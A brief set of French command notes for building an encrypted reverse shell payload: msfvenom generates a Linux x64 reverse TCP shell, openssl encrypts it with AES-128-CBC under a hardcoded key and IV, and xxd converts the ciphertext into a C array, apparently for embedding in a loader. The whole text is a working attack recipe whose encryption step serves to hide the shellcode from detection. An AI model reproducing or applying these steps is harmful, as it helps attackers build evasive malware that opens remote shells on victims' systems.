Generer un reverse_shell_tcp :
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o shell.raw
Le chiffrer en AES : 
openssl enc -aes-128-cbc -nosalt -e -in shell.raw -out shell.enc -K '2b7e151628aed2a6abf7158809cf4f3c' -iv '000102030405060708090a0b0c0d0e0f' 
Recuperer le ciphertext : 
xxd -i shell.enc > shellcode.c > ciphertext to C tab

